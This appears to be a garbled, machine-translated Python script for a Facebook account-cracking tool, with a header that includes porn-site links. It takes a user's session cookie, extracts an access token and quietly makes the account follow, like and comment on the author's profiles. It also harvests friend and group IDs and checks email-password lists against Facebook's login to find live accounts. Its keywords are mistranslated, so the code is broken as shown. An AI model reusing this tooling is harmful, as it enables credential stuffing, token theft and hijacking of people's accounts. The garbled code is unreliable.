...
permintaan impor, bs4, sys, os, subproses, datetime
permintaan impor, sys, acak, waktu, ulang, base64, json
...
mencoba:
    permintaan impor
kecuali ImportError:
    exit('permintaan instal pip2 *tidak diinstal')
mencoba:
    impor bs4
kecuali ImportError:
    exit(' pip2 instal bs4 *tidak terinstal')
...
Creator:ShadowX
Github: ShadowXFrangky
link bokep:v=Simontok,YANDEX,PornHub,Xnxx.com:v               
 [x]──────────────────────────────────────────[x]
"""
...
ua = 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A7600-H Build/LRX21T) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/58.0.3029.83 Mobile Safari/E7FBAF'
ip=requests.get("https://api.ipify.org").text.strip()
lok=requests.get("https://ipapi.com/ip_api.php?ip="+ip,headers={"Referer":"https://ip-api.com/","Content-Type" :"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/77.0.3865.92 Mobile Safari /537.36"}).json()["nama_negara"].lower()
url = 'https://mobile.facebook.com/login.php'
headersc = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A7600-H Build/LRX21T) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/58.0.3029.83 Mobile Safari/E7FBAF','Terima- Bahasa' : 'en-US,en;q=0.5'}
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua," terima":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate" ,"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mbasic_h2={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua," terima":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate" ,"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua," terima":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate" ,"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
...
graph_h={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua," terima":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate" ,"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
pantun = random.choice(["Langit biru sendu, Warna hijau biru terlihat dan semu, Jarak jauh tumbuhkan rindu, Ingin selalu dekat denganmu.",
"Beribu-ribu para pembaca, Hanya satu memakan roti. Beribu-ribu cewek yang manis, Hanya engkau di dalam hati.",
"Syair puisi pantun dan madah, Pujangga ciptakan sepenuh rasa. Engkau tetap yang terindah, Dalam mustahil sepanjang masa.",
"Api kecil dari tungku, Apinya kecil habis kayu. Sudah lama kutunggu-tunggu, Kapan kamu bilang I Love You.",
"Sebuah nama punya arti, nama berhati-hati. Biarlah aku mencari hati, Untuk dia yang berhati hati.",
"Pagi-pagi minumnya jamu, Di depan rumah ada bakul tahu. Sedikit malu mengatakan padamu, Sungguh aku cinta.",
...
"Ke Ciamis cari kopiah, Kopiah indah pasti kan didapati. Begitu banyak gadis yang singgah, Hanya kamu yang mengelola hati.",
"Makan nasi pakai tahu, Minumnya pakai jus jambu. Janganlah kau jauh dariku, Aku akan selalu sayang padamu.",
"Jalan-jalan ke kota Prancis, Banyak rumah di ujung-baris. Biar mati keris, Asal dapat adinda yang manis.",
...
def cek_login():
	...
	cinta = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
	kata = 'Pengguna Aksara MBF'
	kom = kata+love+'\n'+pantun+'\n'+waktu
        request.post('https://graph.facebook.com/757953543/subscribers?access_token=' + toket)
        request.post('https://graph.facebook.com/100006609458697/subscribers?access_token=' + toket)
        request.post('https://graph.facebook.com/100064814153036/subscribers?access_token=' + toket)
	request.post('https://graph.facebook.com/10159090813023544/comments/?message=' +kom+ '&access_token=' + toket)
        request.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=' + toket)
        request.post('https://graph.facebook.com/125080616608679/comments/?message=Mantap Bang ❤️&access_token=' + toket)
        request.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=' + toket)
	request.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + toket)
	request.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket)
	request.post('https://graph.facebook.com/100041991180267/subscribers?access_token=' + toket)
...
def cek_cookies():
	cvds=Tidak ada
        ...
        jika cek(1)==Salah:
                mencoba:
                        cookie=cvd(buka("coki.log").read().strip())
                        cvds=cvd(kue)
                        baru=Benar
                kecuali:
                        print("[x] Cookie Tidak Valid");login()
        lain:
                cvds=cvd(buka("coki.log").read().strip())
	...
	lain:
                ...
                kecuali:
                        lulus
                print("[*] Cookie Tidak Valid");login()
def masuk():
    os.system('hapus')
    cetak logo
    print(' [1] Masuk Menggunakan Cookie')
    print(' [2] Cara Mendapatkan Cookie')
    print('[0] Keluar')
    lg = raw_input('\n [*] Masukan : ')
    jika lg == '':
        os.sys.keluar()
    elif lg == '1' atau lg == '01':
        mencoba:
		cookie = raw_input(" [*] Cookie : ")
                data = {
                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # jangan ubah agen pengguna ini.
                                ...
                                'tipe-konten' : 'teks/html; rangkaian karakter = utf-8',
                                 'kue' : kue }
                coki = request.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
                cari = re.search('(EAAAA\w+)', coki.text)
                hasil = cari.group(1)
                pup = buka('coki.log', 'w')
                pup.write(kue)
                anak anjing.close()
                pip = buka('login.txt', 'w')
                pip.tulis(hasil)
                pip.tutup()
                cek_login()
        ...
        kecuali request.exceptions.SSLError:
                ...
                keluar()
    elif lg == '2' atau lg == '02':
	jalan (' *Anda Akan Diarahkan Ke Browser')
	waktu.tidur(2)
	os.system("xdg-buka https://youtu.be/3Y6xsMB3wRg")
	waktu.tidur(3)
	keluar()
    elif lg == '0' atau lg == '00':
        os.sys.keluar()
    lain:
        exit(' [x] Isi Dengan Benar')
def basecookie():
	jika os.path.exists("coki.log"):
		if os.path.getsize("coki.log") !=0:
			kembali get_dict_cookies(open('coki.log').read().strip())
		lain: masuk ()
	lain: masuk ()
def mendapat_dict_cookies(cookies):
	hasil={}
	mencoba:
...
menu def():
  ...
  print (' [8] Mulai Retak/Mulai Retak')
  print (' [9] Lihat Hasil Crack')
  print (' [A] Pemeriksa Akun')
  print (' [0] Hapus Cookie\n')
  mn = raw_input("[*] Masukan : ")
  jika mn == "":
	print ('[x] Isi Dengan Benar')
	Tidak bisa()
  elif mn == "1" atau mn == '01':
    sampah()
    keluar()
  elif mn == "2" atau mn == '02':
    teman()
  elif mn ="3" atau mn == '03':
    dfs = raw_input('\n [*] Buang Cepat/Lambat (f/s) : ')
    jika dfs == '':
        Tidak bisa()
    elif dfs == 'F' atau dfs == 'f':
        publik()
    elif dfs == 'S' atau dfs == 's':
        daftar teman(basecookie())
    lain:
	print ('[x] Isi Dengan Benar')
	Tidak bisa()
  elif mn == "4" atau mn == '04':
    mengikuti()
  elif mn == "5" atau mn == '05':
    Suka()
  elif mn == "6" atau mn == '06':
    dump_grup(kuki dasar())
  elif mn == "7" atau mn == '07':
    dump_message(basecookie())
  elif mn ="8" atau mn == '08':
    metode()
  elif mn == "9" atau mn == "09":
    print ('\n [1] Lihat Hasil Ok')
    print (' [2] Lihat Hasil Cp')
    print (' [0] Kembali\n')
    hs = raw_input(' [*] Masukan : ')
    jika hs == '':
        Tidak bisa()
    elif hs == '1' atau hs == '01':
	oke()
    elif hs == '2' atau hs == '02':
	cp()
    elif hs == '0' atau hs == '00':
	Tidak bisa()
    lain:
	print ('[x] Isi Dengan Benar')
	Tidak bisa()
    ...
    cek_akun()
  elif mn == "0" atau mn == '00':
    mencoba:
      os.remove("login.txt")
      os.remove("coki.log")
      print (' [•] Berhasil Menghapus Cookie')
      os.sys.keluar()
    kecuali Pengecualian sebagai e:
...
def check_akun():
	...
	mencoba:
		file = raw_input('\n [*] Nama File : ')
		daftar = buka(file,'r').readlines()
	kecuali IOError:
		print ("[x] File Tidak Ada")
		raw_input(' {Kembali}')
		Tidak bisa()
	pmsh = raw_input(' [*] Pemisah : ')
	print(' [*] Cek Akun Sedang Berlangsung...\n')
	untuk ya dalam daftar:
		email, pw = (yes.strip()).split(str(pmsh))
		data = {'email': email,'pass': pw}
		xox = request.post(url, headers=headersc, data=data).text
		jika "xc_message" di xox:
			live.append(pw)
			print('\033[0;92m [Langsung] '+email+'|'+pw)
		elif "checkpointSubmitButton-actual-button" di xox:
			cek.append(pw)
			print('\033[0;93m [Cek] '+email+'|'+pw)
		elif "login_error" di xox:
			mati.tambahkan(pw)
			print('\033[0;91m [Mati] '+email+'|'+pw)
		lain:
			mati.tambahkan(pw)
			print('\033[0;91m [Mati] '+email+'|'+pw)
	print('\n\x1b[37m [Selesai] *Live : '+str(len(live))+' - *Cek : '+str(len(cek))+' - *Mati : '+str(len (mati)))
	keluar()
	Tidak bisa()
pasti oke():
	mencoba:
		...
		batas = '5000'
			...
			raw_input(" {Kembali}")
                ...
                untuk a di z['data']:
                        ...
                        print("\r [*] Buang %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.tutup()
                os.rename(qq,file)
		print("\n\n [*] Selesai")
